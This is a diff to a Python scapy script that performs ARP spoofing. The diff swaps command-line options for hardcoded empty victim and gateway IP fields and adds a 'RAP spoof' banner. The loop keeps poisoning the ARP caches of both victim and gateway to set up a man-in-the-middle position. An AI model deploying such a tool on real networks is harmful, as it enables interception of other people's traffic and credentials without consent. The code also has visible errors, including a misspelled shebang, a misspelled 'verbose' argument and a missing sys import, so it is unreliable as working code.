@@ -1,20 +1,10 @@
 #!/usr/bin/env pythin
 
+#python2
 import scapy.all as scapy
 import time
-import optparse
 
 
-def get_arguments():
-    parser = optparse.OptionParser()
-    parser.add_option("-t", "--target_ip", dest="target_ip", help="Victim address ip")
-    parser.add_option("-g", "--gateway_ip", dest="gateway_ip", help="Gateway ip")
-    (options, arguments) = parser.parse_args()
-    if not options.target_ip:
-        parser.error("[-] Please specify an target ip, use --help for more info")
-    elif not options.gateway_ip:
-        parser.error("[-] Please specify a gateway ip, use --help for more info")
-    return options
 
 
 def get_mac(ip):
@@ -38,16 +28,34 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbouse=False)
 
 
-options = get_arguments()
-target_ip = options.target_ip
-gateway_ip = options.gateway_ip
+print("""
+  _____            _____                           __          
+ |  __ \     /\   |  __ \                         / _|         
+ | |__) |   /  \  | |__) |  ___ _ __   ___   ___ | |_          
+ |  _  /   / /\ \ |  ___/  / __| '_ \ / _ \ / _ \|  _|         
+ | | \ \  / ____ \| |      \__ \ |_) | (_) | (_) | |           
+ |_|  \_\/_/    \_\_|      |___/ .__/ \___/_\___/|_|___ ______ 
+ | |           |  _ \          | |        /_ |___ \___ \____  |
+ | |__  _   _  | |_) | ___  _ _|_|_   _ ___| | __) |__) |  / / 
+ | '_ \| | | | |  _ < / _ \| '_ \| | | / __| ||__ <|__ <  / /  
+ | |_) | |_| | | |_) | (_) | | | | |_| \__ \ |___) |__) |/ /   
+ |_.__/ \__, | |____/ \___/|_| |_|\__,_|___/_|____/____//_/    
+         __/ |                                                 
+        |___/                                                  
+"""
+
+#write ip
+target_ip = ""
+#write ip
+gateway_ip = ""
 sent_packets_counts = 0
 try:
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
-        sent_packets_counts += 2
-        print("\r[+] Sent two packets" + str(sent_packets_counts), ebd="")
+        sent_packets_counts = sent_packets_counts + 2
+        print("\r[+] Sent two packets" + str(sent_packets_counts)),
+        sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
     print("[+] detected CTRL + C .... Quitting")
